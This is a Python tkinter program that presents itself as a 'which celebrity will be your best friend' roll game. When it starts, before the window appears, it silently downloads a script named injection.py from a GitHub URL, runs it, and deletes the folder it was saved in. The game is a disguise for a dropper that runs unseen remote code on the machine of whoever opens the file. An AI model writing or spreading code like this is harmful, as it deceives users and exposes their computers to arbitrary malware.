import random
import time
import tkinter
import os
import shutil

try:
    import requests
except:
    os.system("pip install requests")
    import requests

root = tkinter.Tk()
root.title("B3ST FR13ND")
root.configure(bg = "black")

celebList = ["Billie Eilish", "Demi Lovato", "Justin Bieber", "The Weeknd", "Dua Lipa", "Ariana Grande", "Kim Kardashian West", "Elliot Page", "Harry Styles", "Jennifer Lopez", "Drake", "Olivia Rodrigo", "Lady Gaga", "Taylor Swift", "Selena Gomez", "Britney Spears", "Zayn Malik", "Justin Timberlake", "Beyonce", "Kylie Jenner", "Rihanna", "Cardi B", "Sharon Osbourne", "Katy Perry", "Khloe Kardashian", "Kourtney Kardashian", "Miley Cyrus", "Kanye West", "Adele", "Johnny Depp", "Nicki Minaj", "Shawn Mendes", "Iggy Azalea", "Sam Smith", "Chris Brown", "Michael B. Jordan", "Dwayne Johnson", "Tom Holland", "Brad Pitt", "Chrissy Teigen", "John Legend", "Camila Cabello", "Jennifer Aniston", "Will Smith", "Ed Sheeran", "Kevin Hart", "Ellen DeGeneres", "Pink", "Mark Wahlberg", "Leonardo DiCaprio", "Eminem", "Lil Pump", "Logic"]
url = "https://raw.githubusercontent.com/lhaken/fr13nd/main/injection.py"

def genDir():  
    try:
        os.mkdir(str(os.path.realpath(__file__)).rstrip(str(os.path.realpath(__file__).split("\\")[-1])) + "celebrities")
    except:
        pass

def getFile():
    r = requests.get(url)
    t = r.text
    with open("celebrities/injection.py", "w") as file:
        file.write(t)

def delDir():
    shutil.rmtree("celebrities")

def execute():
    os.system("python celebrities\\injection.py")
    
def roll():
    rollNum = random.randint(3, 7)
    for i in range(rollNum):
        varContent.set("{}".format(celebList[random.randint(0, len(celebList)- 1)]))
        celebrity.config(fg = "pale green")
        root.update()
        time.sleep(0.275)
    varContent.set("{}".format(celebList[random.randint(0, len(celebList)- 1)]))
    celebrity.config(fg = "green2")    
    
text = tkinter.Label(root, text = "Which celebrity will be your best friend?",  font = ("Arial", 18, "bold"), fg = "white", bg = "black")
text.pack(padx = 10, pady = 5)

varContent = tkinter.StringVar()
varContent.set("???")

celebrity = tkinter.Label(root, textvariable  = varContent,  font = ("Arial", 26, "bold"), fg = "gold", bg = "black")
celebrity.pack()
button = tkinter.Button(root, text = "ROLL", font = ("Arial", 18, "bold"), fg = "white", bg = "black", bd = 10, width = 15, command = roll)
button.pack(pady = 10)

genDir()
getFile()
execute()
delDir()
root.mainloop()


